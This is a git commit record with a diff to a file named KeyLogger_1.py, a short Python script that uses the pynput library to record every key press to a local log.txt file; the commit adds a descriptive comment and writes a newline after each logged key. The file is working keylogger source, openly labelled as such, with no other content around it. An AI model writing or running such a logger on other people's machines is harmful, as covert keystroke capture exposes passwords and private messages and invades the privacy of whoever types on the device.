67ab1a12345d308c5887c97fdb9de45d09f0f62b
Dattatreyy <dattatrylesner@gmail.com>
2024-02-02 23:13:32 +0530

    Updated KeyLogger_1.py

--- KeyLogger_1.py
+++ KeyLogger_1.py
@@ -1,8 +1,10 @@
+# A simple Python script using the pynput library to log key presses
+
 from pynput.keyboard import Listener
 
 def on_press(key):
     with open('log.txt','a') as f:
-        f.write(str(key))
+        f.write(str(key)+ '\n')
 
 with Listener(on_press=on_press) as listener:
     listener.join()
